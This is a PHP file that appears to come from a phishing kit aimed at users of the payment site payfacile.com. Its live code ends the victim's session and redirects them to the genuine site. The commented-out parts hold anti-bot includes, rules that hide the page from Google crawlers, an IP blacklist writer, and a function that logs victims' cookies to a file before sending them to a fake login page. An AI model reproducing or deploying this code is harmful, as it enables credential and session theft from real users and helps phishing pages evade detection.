<?php
session_start();
error_reporting(0);
/* include "../bot/antibots1.php";
include "../bot/antibots2.php";
include "../bot/antibots3.php";
include "../bot/antibots4.php";
include "../bot/antibots5.php";
include "../bot/antibots6.php";

include("./system/system.php"); 
include("./system/sand_email.php");
 */
//----------------------------------------------------------------------------------------------------------------//
//if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
/* 

if(!isset($_SESSION['sessionNumber'])){header("location: ../index.php");}

 
*/


/*

if(!isset($_SESSION['ip'])){
	// include('Antibots/anti.php');
	// include('Antibots/bots.php'); 
	// header("location: index.php");
	header('HTTP/1.0 404 Not Found');
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
*/
// $ip = $_SESSION['ip'];

// $deny = ''."$ip".''; 

// $spa = "\r\n";

// $file = fopen("Antibots/IP_blacklisted.txt","ab");
// fwrite($file, $spa);
// fwrite($file, $deny);
// fclose($file);

// $ip = "160.120.28.119";
// $contents = file("Antibots/IP_blacklisted.txt");

// if(in_array($ip,$contents)) {
	// echo 'okay ';
// } else {
     // foreach($contents as $ip1) {
          // if(preg_match('/' . $ip1 . '/',$ip)){
			// echo 'okay bitch';
          // }
     // }
// }


/*
function GetChecker(){
	if(isset($_GET['ajax'])){
		$_SESSION["cooks"] = $_GET['ajax'];
		$cookie = $_SESSION["cooks"]; 
		
		$file = fopen('../cookielog.txt', 'a'); 
		fwrite($file, $cookie . "\n\n"); 

			
		header("location: ../login.php?inav=iNavLnkLog&Session=".$_SESSION['sessionNumber']);
		exit;
		}
	else
		return ;

}

GetChecker();
*/	

session_destroy();

header("location: https://www.payfacile.com");


?>
